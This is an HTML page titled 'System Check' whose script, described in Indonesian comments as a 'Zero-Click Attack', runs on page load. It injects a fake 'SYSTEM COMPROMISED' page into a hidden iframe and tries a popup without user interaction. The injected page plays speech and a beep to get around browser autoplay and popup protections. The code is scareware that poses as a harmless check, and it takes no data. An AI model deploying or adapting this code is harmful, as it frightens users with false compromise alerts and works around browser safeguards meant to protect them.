<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>System Check</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { background: #111; color: #0f0; font-family: monospace; overflow: hidden; }
  iframe { display: none; }
</style>
</head>
<body>

<script>
(function () {
  'use strict';

  console.log("[!] Memulai Zero-Click Attack...");

  // ============================================
  // KONTEN UNTUK ABOUT:BLANK (Audio & TTS)
  // ============================================
  var payloadHTML = `
    <!DOCTYPE html>
    <html>
    <head><title>System Alert</title></head>
    <body style="background:#000;color:#f00;font-family:monospace;text-align:center;padding-top:20vh;">
      <h1>SYSTEM COMPROMISED</h1>
      <script>
        (function() {
          // A. Putar TTS
          if ('speechSynthesis' in window) {
            window.speechSynthesis.cancel();
            var u = new SpeechSynthesisUtterance("Zero Click Autoplay Bypass Successful. Your system is compromised.");
            u.lang = 'en-US';
            u.rate = 1.0;
            u.volume = 1.0;
            window.speechSynthesis.speak(u);
          }

          // B. Putar AudioContext Beep
          try {
            var ctx = new (window.AudioContext || window.webkitAudioContext)();
            if (ctx.state === 'suspended') {
              ctx.resume().then(function() { console.log('[AC] Resumed'); });
            }
            var osc = ctx.createOscillator();
            var gain = ctx.createGain();
            osc.type = 'sine';
            osc.frequency.value = 880;
            gain.gain.value = 0.5;
            osc.connect(gain);
            gain.connect(ctx.destination);
            osc.start();
            osc.stop(ctx.currentTime + 2.0);
          } catch(e) {}
        })();
      <\/script>
    </body>
    </html>
  `;

  // ============================================
  // METODE 1: IFRAME AUTOPLAY INJECTION
  // ============================================
  function injectAutoplayIframe() {
    // Buat iframe dengan atribut allow="autoplay"
    var iframe = document.createElement('iframe');
    iframe.allow = "autoplay";
    iframe.style.display = "none";
    
    // Set src ke about:blank
    iframe.src = 'about:blank';
    document.body.appendChild(iframe);

    // Tunggu iframe siap, lalu tulis payload ke dalamnya
    iframe.onload = function() {
      try {
        var doc = iframe.contentDocument || iframe.contentWindow.document;
        doc.open();
        doc.write(payloadHTML);
        doc.close();
        console.log("[!] Payload disuntikkan ke iframe about:blank.");
      } catch(e) {
        console.log("[X] Gagal menyuntikkan payload ke iframe:", e.message);
      }
    };
  }

  // ============================================
  // METODE 2: TOP-LEVEL REDIRECT FORCED (window.open)
  // ============================================
  function forceTopLevelRedirect() {
    // Mencoba membuka about:blank secara paksa tanpa gesture
    var win = window.open('about:blank', '_blank');
    if (win) {
      win.document.open();
      win.document.write(payloadHTML);
      win.document.close();
      console.log("[!] Payload disuntikkan ke window baru.");
    } else {
      console.log("[X] Popup diblokir. Menggunakan iframe.");
    }
  }

  // ============================================
  // EKSEKUSI (Zero-Click Trigger)
  // ============================================
  
  // Coba metode Iframe (biasanya diizinkan tanpa popup block)
  injectAutoplayIframe();

  // Coba metode Top-Level (mungkin diblokir jika tidak ada gesture)
  setTimeout(function() {
    forceTopLevelRedirect();
  }, 1000);

})();
</script>
</body>
</html>
